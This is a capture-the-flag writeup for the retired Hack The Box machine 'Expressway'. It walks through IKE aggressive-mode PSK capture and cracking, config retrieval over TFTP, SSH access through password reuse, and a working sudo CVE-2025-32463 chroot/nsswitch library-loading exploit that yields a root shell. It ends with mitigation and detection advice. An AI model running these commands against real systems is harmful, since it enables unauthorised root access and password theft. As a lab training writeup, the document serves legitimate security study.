---
machine: Expressway
os: Linux
difficulty: Easy
platform: Hack The Box
state: Retired
tags: [linux, network, ike, ipsec, tftp, psk, sudo, cve-2025-32463, privesc]
---

# Expressway — Hack The Box (Linux)

[🇪🇸 Español](README.md) | **English**

> **State:** Retired. Reference writeup; no real flags or credentials.

## TL;DR

Only SSH is exposed, plus two UDP services: IKE on 500 and TFTP on 69. Aggressive mode reveals the identity `ike@expressway.htb` and allows capturing the PSK hash, which cracks with `hashcat -m 5400`; TFTP serves `ciscortr.cfg`, which confirms the username. The same password works over SSH for `ike`. The installed `sudo` is vulnerable to CVE-2025-32463: `--chroot` loads an attacker-controlled `nsswitch.conf` and a malicious `libnss_*` library as root.

## Recon

```bash
nmap -Pn -sCV -p22 <IP>
nmap -Pn -sU -sV -p69,500 <IP>
```

- `22` OpenSSH, `500/udp` IKE and `69/udp` TFTP.
- No HTTP or other TCP services.
- The hostname is `expressway.htb`.

## Enumeration

`ike-scan -A` completes the aggressive-mode handshake and prints `ID_USER_FQDN = ike@expressway.htb`. The same command with `--pskcrack` saves the material needed to crack the PSK.

```bash
ike-scan -A <IP>
ike-scan -A <IP> --pskcrack=handshake.txt
hashcat -m 5400 handshake.txt rockyou.txt
```

TFTP does not always show as open in the initial scan; `tftp-enum` confirms it. It serves `ciscortr.cfg`, whose config shows the `ike` user with a masked password. It can be enumerated with the NSE script or fetched directly:

```bash
nmap -Pn -sU -p69 --script tftp-enum <IP>
curl -s tftp://<IP>/ciscortr.cfg
```

## Foothold

The cracked PSK is reused as `ike`'s password; the TFTP config confirms the account exists. `netexec ssh` confirms access and `sshpass` opens the session. The user flag is in the home directory.

## Lateral movement

Not applicable: `ike` is the only non-root user with a shell. Their SSH key grants no extra access.

## Privilege escalation

The vulnerable instance is `sudo` 1.9.17, within the CVE-2025-32463 range (1.9.14 to 1.9.17). Create `newroot/etc/nsswitch.conf` with `passwd: /0xdf`; glibc prepends `libnss_` and looks for `libnss_/0xdf.so.2` in the current directory. Compile a library whose constructor spawns a shell and run `sudo --chroot newroot true`; `sudo` enters the chroot before finishing policy evaluation and loads the library as root.

```bash
mkdir -p newroot/etc libnss_
echo "passwd: /0xdf" > newroot/etc/nsswitch.conf
gcc -shared -fPIC -o libnss_/0xdf.so.2 x.c
sudo --chroot newroot true
```

The CVE-2025-32462 variant abuses a sudoers rule tied to another host; the result is the same.

## Evidence

- Aggressive handshake with a leaked identity.
- Cracked IKE-PSK SHA1 hash.
- `ciscortr.cfg` config retrieved over TFTP.
- SSH access as `ike`.
- `sudo --chroot` loading the library and a root shell.

## Lessons learned

- A single small UDP port can be the only way in.
- Exposed TFTP leaks network configurations and usernames.
- IKE aggressive mode leaks identity and crackable material.
- Reusing the PSK as a system password multiplies the impact.
- `sudo --chroot` with a writable `nsswitch.conf` means root execution.

## Mitigation and detection

- Use IKEv2 in main mode with a long, random PSK.
- Never reuse network secrets as user passwords.
- Filter UDP/69 and never publish router configs over TFTP.
- Upgrade `sudo` to 1.9.17p1 or later and restrict `--chroot`.
- Alert on `sudo --chroot` and on `nsswitch.conf` writes outside `/etc`.

## References

- [0xdf — Expressway](https://0xdf.gitlab.io/2026/03/07/htb-expressway.html)
- [IppSec — Expressway](https://www.youtube.com/watch?v=XAsuxQCBVmY)
- [Hack The Box — Expressway](https://app.hackthebox.com/machines/expressway)
